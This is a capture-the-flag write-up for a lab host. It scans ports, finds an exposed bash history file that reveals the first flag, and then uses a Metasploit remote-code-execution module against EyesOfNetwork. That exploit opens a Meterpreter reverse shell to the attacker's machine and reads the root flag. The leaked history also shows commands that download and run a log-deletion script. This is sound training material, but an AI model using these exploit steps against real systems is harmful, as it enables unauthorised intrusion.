\clearpage
## CTF 01

> Capture The Flag.
> 
> IP: 192.168.10.18
> 
> The flag is stored in the flag.txt file.

> Capture The Flag.
> 
> IP: 192.168.10.18
> 
> The flag is stored in the root.txt file.

### Nmap

To first gain knowledge on what services are running on the machine, a port scan is executed using nmap. With it, all 65535 possible TCP ports are scanned for an answer. If open, the tool will gain information on the running versions.

```bash
$ nmap -sV -Pn $IP -p-
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-13 15:58 CEST
Nmap scan report for 192.168.10.18
Host is up (0.0025s latency).
Not shown: 65527 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0)
66/tcp   open  http            SimpleHTTPServer 0.6 (Python 2.7.5)
80/tcp   open  http            Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips
	mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
111/tcp  open  rpcbind         2-4 (RPC #100000)
443/tcp  open  ssl/http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips
	mod_fcgid/2.3.9 PHP/5.4.16 mod_perl/2.0.11 Perl/v5.16.3)
2403/tcp open  taskmaster2000?
3306/tcp open  mysql           MariaDB (unauthorized)
8086/tcp open  http            InfluxDB http admin 1.7.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 134.22 seconds
```

The scan shows that there are five known services running:
- OpenSSH on port 22
- A python webserver on port 66
- An apache webserver on port 80 and 443
- A MariaDB database on port 3306
- An admin interface for InfluxDB on port 8086

### Website 1
Since the portscan showed two webservers, these are analysed. On port 66 there is a website, that looks like the website of [Backblaze](https://www.backblaze.com/). On the top is a navigation bar that shows a login button. The navigation seems to be broken, since the content won't change.

![First website](ctf1/website1.png)

After the initial look a gobuster scan is initiated, to gather information on known paths and files.

```bash
$ gobuster dir -u http://$IP:66 -w /usr/share/wordlists/dirb/common.txt -k 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.18:66
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/13 16:10:10 Starting gobuster in directory enumeration mode
===============================================================
/.bash_history        (Status: 200) [Size: 319]
/index.htm            (Status: 200) [Size: 17477]
/index_files          (Status: 301) [Size: 0] [--> /index_files/]
                                                                 
===============================================================
2022/06/13 16:10:15 Finished
===============================================================
```

Gobuster found a file called `.bash_history`, which is a file that is normally stored in the home directory of an user and contains the history of used commands. To show its content, curl is used:


```bash
$ curl http://$IP:66/.bash_history
nano /etc/issue
nano /etc/hosts
nano /etc/hostname
ls
crontab -e
ls
rm index.htm 
wget 192.168.2.43:81/db7i.htm
mv db7i.htm index.htm
nano /etc/hostname
nano /etc/hosts
ls
wget 192.168.2.43:81/logdel2
bash logdel2
wget 192.168.2.43:81/root.txt
mv root.txt flag.txt
nano flag.txt
ls
shutdown -h now
ip a
shutdown -h now
```

In the history file, a `flag.txt` is edited. So we try to request this file.

```bash
$ curl http://$IP:66/flag.txt -k        
cyberctfd{r5KYSTQmMve4KVIoaeaVQH4NUfD7caR6}
```

### Website 2
The second website on port 80 redirects, as expected, to port 443 using TLS and a self signed certficate. It shows a login screen to a service called `Eyes Of Network`

![Second website](ctf1/website2.png)

A link on the bottom of the page redirects so the softwares homepage. On it, there is news article about a security issue. After some research, we found that there is an exploit using meterpreter for CVE-2020-8657 and CVE-2020-8656.

```bash
$ msfconsole

> use exploit/linux/http/eyesofnetwork_autodiscovery_rce
msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > set RHOSTS 192.168.10.18

msf6 exploit(linux/http/eyesofnetwork_autodiscovery_rce) > exploit

[*] Started reverse TCP handler on 192.168.9.5:1337 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target is EyesOfNetwork 5.3 or older with API version 2.4.2.
[*] Target is EyesOfNetwork version 5.3 or later. Attempting exploitation using CVE-2020-8657 or CVE-2020-8656.
[*] Using generated API key: 41a41f52395de8a08c2de5e1e80ab6f47f5655a53738ec9848f52171143e90d3
[+] Authenticated as user hwAENgHt
[*] Command Stager progress - 100.00% done (897/897 bytes)
[*] Sending stage (3020772 bytes) to 192.168.10.18
[*] Meterpreter session 1 opened (192.168.9.5:1337 -> 192.168.10.18:51476 ) at 2022-06-13 17:12:54 +0200

meterpreter > ls /
Listing: /
==========

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  0      fil   2021-04-03 16:50:18 +0200  .autorelabel
040555/r-xr-xr-x  36864  dir   2021-04-03 19:01:30 +0200  bin
040555/r-xr-xr-x  4096   dir   2021-04-03 19:00:33 +0200  boot
040755/rwxr-xr-x  3120   dir   2022-06-13 09:30:57 +0200  dev
040755/rwxr-xr-x  12288  dir   2022-06-13 09:30:58 +0200  etc
040755/rwxr-xr-x  4096   dir   2021-04-03 16:37:42 +0200  home
040555/r-xr-xr-x  4096   dir   2021-04-03 16:37:53 +0200  lib
040555/r-xr-xr-x  36864  dir   2021-04-03 16:38:08 +0200  lib64
040700/rwx------  16384  dir   2021-04-03 16:34:51 +0200  lost+found
040755/rwxr-xr-x  4096   dir   2018-04-11 06:59:55 +0200  media
040755/rwxr-xr-x  4096   dir   2018-04-11 06:59:55 +0200  mnt
040755/rwxr-xr-x  4096   dir   2018-04-11 06:59:55 +0200  opt
040555/r-xr-xr-x  0      dir   2022-06-13 09:30:51 +0200  proc
040550/r-xr-x---  4096   dir   2022-06-13 10:03:04 +0200  root
100644/rw-r--r--  44     fil   2022-05-15 16:57:57 +0200  root.txt
040755/rwxr-xr-x  1000   dir   2022-06-13 10:03:04 +0200  run
040555/r-xr-xr-x  16384  dir   2021-04-03 16:38:04 +0200  sbin
040755/rwxr-xr-x  4096   dir   2021-04-03 16:37:17 +0200  share
040755/rwxr-xr-x  4096   dir   2021-04-03 16:43:07 +0200  srv
040555/r-xr-xr-x  0      dir   2022-06-13 09:30:53 +0200  sys
041777/rwxrwxrwx  4096   dir   2022-06-13 17:12:55 +0200  tmp
040755/rwxr-xr-x  4096   dir   2021-04-03 16:35:14 +0200  usr
040755/rwxr-xr-x  4096   dir   2021-04-03 16:43:04 +0200  var

meterpreter > cat /root.txt
cyberctfd{cROGRMZeGLNFZ3XIfaeaKoT2OKTB4qhM}

```

The exploit can be used to execute code remotely and open a reverse shell to the attackers machine.